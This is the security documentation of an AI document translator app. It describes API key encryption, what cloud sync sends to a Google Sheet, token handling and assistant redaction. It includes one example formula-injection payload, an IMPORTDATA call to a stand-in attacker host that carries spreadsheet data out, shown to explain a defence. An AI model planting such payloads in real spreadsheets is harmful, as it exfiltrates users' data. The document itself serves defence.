# Security

How **AI Documents Translator & Editor** protects your documents, your API keys and the
optional cloud sync — what is protected, how, and what is deliberately *not* collected.

## Threat model (summary)

| Asset | Where it lives | Main risk | Protection |
| --- | --- | --- | --- |
| Documents, glossary, logs | IndexedDB in your browser | Someone else using the same browser profile / device | Nothing leaves the device unless you enable sync; full-device encryption is the OS's job |
| Provider API keys (Gemini, OpenRouter, Groq, …) | IndexedDB `apiKeys`, sealed | Read out of a backup, an exported DB, a log line, or a sync payload | WebCrypto AES-GCM + PBKDF2 sealing; never in backups or logs in plaintext; **not synced** unless you switch on the separate, off-by-default plaintext key sync (below) |
| Sync access token | Settings (sealed), or a `VITE_` build variable | Read by anyone with the bundle, or replayed against your Sheet | Treat a deployed build as containing it; rotate it in the Apps Script `TOKEN` Script Property and rebuild |
| Cloud Sheet contents | Google Sheet (relay) | Unauthorized read/write of the relay | Shared-secret token, `UNAUTHORIZED` on mismatch, LockService against concurrent runs; disable sync to remove this surface entirely |
| Assistant OpenRouter key | Your `proxy/` server only | Leak through the frontend bundle or a response body | Never `VITE_`-prefixed, never bundled, never logged; responses scrub it defensively |
| Page content rendered from translated/HTML text | DOM | Script injection (XSS) | No `dangerouslySetInnerHTML` anywhere; DOMPurify single gate + HTML escaping (see [DOM posture](#dom-and-csp-posture)) |

**Explicitly out of scope:** an attacker who already controls your browser profile or your
operating system (they can read anything the browser can), and a compromised upstream AI
provider (your prompts necessarily travel to whichever provider you choose).

## API key storage

Keys are sealed **before** they touch storage:

- `src/core/crypto.ts` — WebCrypto **AES-GCM** with a **PBKDF2-SHA256** derived key
  (150,000 iterations). Every seal uses a fresh random salt and a 96-bit IV, and the stored
  payload records `{v, kdf, iterations, salt, iv, data}` so future versions can migrate.
- Two protection modes (`src/core/vault.ts`):
  - **device-bound** (default) — derived from a per-device secret that only lives in this
    browser profile. Protects against a stolen backup or an exported database, **not** against
    someone already using your profile.
  - **passphrase** — you type a passphrase once per session; it is held in memory only, never
    written to IndexedDB, never logged, never put in a sync payload.
- `src/db/repo-apiKeys.ts` is the only reader: plaintext appears for an explicit `reveal()`
  (editing), and the run path opens keys **inside the translation worker** across the
  `postMessage` boundary, so the main thread never holds a live secret.
- JSON backups carry keys **still sealed**; they only open on the device that created them.
- The UI shows only a masked summary (last four characters) and usage/cooldown counters.

## What syncs, and what never does

| Data | Syncable? | Why |
| --- | --- | --- |
| `projects` / `pages` / `blocks` / `glossary` | On by default | Content only |
| `settings` — **provider settings** (`ai.*` ids) | On by default | The configuration that decides how this app talks to AI services. It names providers and models, but never a credential |
| `settings` — everything else (theme, language, cache, sync policy) | **Off by default** | A separate toggle, so unrelated preferences never surprise-sync |
| `apiKeys` (all provider keys) | **Off by default, separate opt-in** | See [Plaintext key sync](#plaintext-key-sync-opt-in-and-reversible). Nothing travels until you switch it on |
| Settings rows whose id or field looks secret | **Never** | Client filter `isSecretSettingId()` in `src/sync/protocol.ts` — case-insensitive over `key`, `token`, `secret`, `password`, `authorization` — drops them before a request is built; `sync.appsScriptToken` is the important one. A *boolean* value is never treated as a credential, so the `apiKeys: true` switch inside `sync.entities` is not caught by it |
| Anything matching the same pattern on the server | **Rejected** | `apps-script/Code.gs` re-checks and fails the **whole** request with `SECRET_NOT_ALLOWED` — one bad record aborts the batch on purpose. The guard covers the `Settings` sheet only; the `ApiKeys` sheet is the one deliberate exception |
| `syncConflicts`, `syncMeta`, `sourceFiles` | **Never** | Device-local cursors/vectors, and raw PDF bytes |

Defence in depth: even if the client-side filter were removed, the server guard still refuses
the batch, and even if the server guard were removed, the client never builds the payload.

## A document cannot write a formula into your Sheet

Everything sync writes is text that came from a PDF, a translation model, or a field somebody
typed. Sheets parses a cell on the way *in*, not only on display: a string starting with `=`
becomes a live formula, one starting with `+`, `-` or `@` becomes arithmetic, one that looks like
a date becomes a date. So a document opening with

```
=IMPORTDATA("https://attacker.example/collect?d=" & A1)
```

would, on the next sync, phone home from inside the reader's own spreadsheet — carrying whatever
else that spreadsheet holds. This is not exotic: an equation page, a hyphen bullet, a phone number
and a date are all ordinary content that trips the same parse.

`Code.gs` therefore writes every request-derived value through `writePlain_`, which formats the
destination range as **Plain Text** before `setValues`. The parse never happens, and — unlike the
usual apostrophe-prefix mitigation — nothing is added to or removed from the value, so a paragraph
that opens with `-` returns from the Sheet with its hyphen intact. Numbers and booleans keep their
type; Plain Text only stops *text* from being read as something else.

The only raw `setValues` calls left are the header rows, whose contents are literals defined at the
top of the same file. `src/sync/appsScript.test.ts` reads `Code.gs` and fails if a data write ever
bypasses the helper again.

## Plaintext key sync (opt-in, and reversible)

Your Sheet is your own database — you created it, you hold its `TOKEN`, and you control who it
is shared with. Typing every provider key again on every device is the problem the option
removes, so **Settings → Data → Cloud sync → API keys** can copy them there. It is a distinct
switch, it is **off by default**, and turning it on is the only way keys ever move.

If you switch it on, these are the facts:

- **The value is written in readable text.** Anyone who can open that spreadsheet — or any
  service connected to it — can copy your keys. A shared link is enough. The app says this in
  the panel before you switch it on, and again while it is on.
- It does **not** travel through a `VITE_` build variable, a log line, a JSON backup, or a
  notification. Only the `ApiKeys` sheet.
- Only identifying fields go: provider, label, model list, enabled flag, last four, the secret
  and a creation timestamp. This device's runtime bookkeeping — lifetime request counters,
  cooldowns, key-pool bucket positions, probe results — deliberately stays behind, because
  last-writer-wins would let one device's counters clobber the other's.
- The sealed payload is opened **at the moment the request is built**, so no readable secret is
  ever written back into IndexedDB or into the sync outbox, and a delete tombstone carries no
  payload at all.
- Pulling a key **re-seals it locally** before it can touch storage — with your vault passphrase
  if one is unlocked, with the per-device secret otherwise. A `cipher` arriving from another
  device is never trusted: it belongs to a device whose key does not exist here.
- Switching the toggle off stops new writes. It does not erase rows already in the sheet —
  delete the `ApiKeys` tab, or use **Delete cloud data**, for that.

**Turn it off** if you share the spreadsheet, if it lives in a work account you do not control,
or if you do not actively need the same keys on a second device.

### An older backend cannot break your sync

`Code.gs` rejects an unknown entity while validating the *whole* batch, before any row is
written. One key change pushed at a deployment that predates the `ApiKeys` sheet would therefore
have failed **every** push, for every entity. So the client asks `ping` which entities the
backend can store, and holds key rows — queued, with backoff — until it says yes. Other entities
keep syncing throughout. Press **Test connection** after re-deploying to clear the notice.

## Sync token handling

- Entered once in **Settings → Data → Cloud sync**. The app stores it as a **sealed** value
  (`sync.appsScriptToken` = `{sealed, lastFour}`) via the same AES-GCM helpers as API keys and
  shows only the last four characters in the UI.
- The stored value wins; `VITE_APPS_SCRIPT_TOKEN` is only a build-time fallback when the
  setting is empty (`src/sync/engine.ts`).
- It is sent inside the `POST text/plain` body `{token, action, deviceId, …}` on every sync
  call. It is never written to the Logs page, never echoed in a toast, and the client-side
  redaction rules (below) scrub it if it ever appears in assistant context.
- The server compares it against the `TOKEN` Script Property and answers `UNAUTHORIZED` on any
  mismatch — **all sync errors are HTTP 200 JSON envelopes**, so check `code`, not the status.
- **Rotation:** change the `TOKEN` property in Apps Script → Project Settings, re-enter it on
  each device, redeploy nothing. If you shipped the token in a `VITE_APPS_SCRIPT_TOKEN` build,
  rotate it: anyone with that bundle had it.
- The token protects *your* sheet, not your identity — Google's own access controls decide who
  can open the spreadsheet. Deploy the web app as "Anyone" only with a strong token, per
  [GOOGLE_APPS_SCRIPT_SETUP.md](GOOGLE_APPS_SCRIPT_SETUP.md).

## Assistant redaction

`src/assistant/redact.ts` runs over **everything leaving the device** for the assistant — the
question, the structured context and any answer text the proxy echoes back. Patterns cover
shapes this app can actually contain: `sk-…` / `sk-or-v1-…` style keys, `Bearer …` and
`Basic …` headers, GitHub tokens, AWS access-key ids, Google `AIza…` keys, JWTs,
`key=`/`token=`/`secret=`/`password=` pairs, the app's own sealed-payload blobs, long hex
fingerprints and generic long opaque tokens — all replaced with `[REDACTED]`.

Redaction is deliberately aggressive: a false positive costs a `[REDACTED]` in a log line; a
miss could leak a live key. The proxy adds its own layer — it never returns the
`OPENROUTER_ASSISTANT_KEY`, truncates upstream errors to a safe 300-character message, and
logs only method/path/status/duration.

## Environment files

- `.env`, `.env.*` are **git-ignored** (`.env.example` is the committed, empty template), and
  `proxy/.gitignore` covers `proxy/.env` the same way.
- Only `VITE_`-prefixed values reach the browser bundle. That is exactly why the assistant key
  is **never** a `VITE_` variable: `OPENROUTER_ASSISTANT_KEY` lives only in `proxy/.env` (or a
  `wrangler secret`).
- Remember that `VITE_` values are baked in at build time — they are not secrets, just
  configuration. Do not paste provider keys into `.env` at all; put them in Settings → AI
  Providers so they get sealed.
- The push helper `tools/push-to-github.*` verifies `.gitignore` covers `.env`, `node_modules`
  and `dist` before it will commit, and never stores credentials.

## DOM and CSP posture

Verified against the current code:

- **No `dangerouslySetInnerHTML` and no raw `innerHTML` assignment anywhere in `src/`.**
- `src/editor/sanitize.ts` is the **single gate** for the few paths that legitimately need
  markup (print frame, HTML preview, rich-text round trips): DOMPurify with an explicit
  tag/attribute allow-list, no `eval`, no inline event handlers, no remote URLs.
- The HTML exporter escapes every piece of text through `escapeHtml` (`src/export/html.ts`)
  rather than trusting input.
- The app does **not** ship a `Content-Security-Policy` meta tag today. If you self-host, add
  a CSP at your server (see [DEPLOYMENT.md](DEPLOYMENT.md)) — the code is CSP-friendly (no
  `eval`, no inline handlers in generated markup), but the header is yours to send.
- Local-storage reads in the UI are routed through `src/lib/storage.ts` helpers (ESLint
  restricts `localStorage` usage) so preferences cannot be smuggled in unvalidated shapes.

## What is *not* collected

- **No telemetry, no analytics, no crash reporting, no cookies, no third-party trackers.**
- No accounts, no server of ours: there is no "our backend" — the optional backends are *your*
  Google Sheet and *your* assistant proxy.
- The app makes network requests only when you act: a translation call, an OCR language pack
  download, a sync run, or an assistant question.
- Logs are local rows in IndexedDB; exporting them is an explicit action.

## Reporting a problem

- Open a **GitHub issue** at
  <https://github.com/minkhantthu2692-gif/Ai-Documents-Translator-Editor/issues> — that is the
  only reporting channel; this project does not publish a security email.
- Write the issue title as a plain summary and add a `security` label if you can.
- **Do not paste live keys, tokens or your sync URL with the token in the query string.**
  Reference them by shape instead (e.g. "`sk-…` redacted by `redact.ts` did not catch …").
- For reproduction steps, prefer the **Logs → Export JSON** file after checking it for secrets
  (it is already local, and you can read it before attaching).

## Related documents

- [ARCHITECTURE.md](ARCHITECTURE.md) — where each of these layers sits.
- [TROUBLESHOOTING.md](TROUBLESHOOTING.md) — reason and sync error codes.
- [../proxy/README.md](../proxy/README.md) — proxy limits, CORS allowlist and deployment.
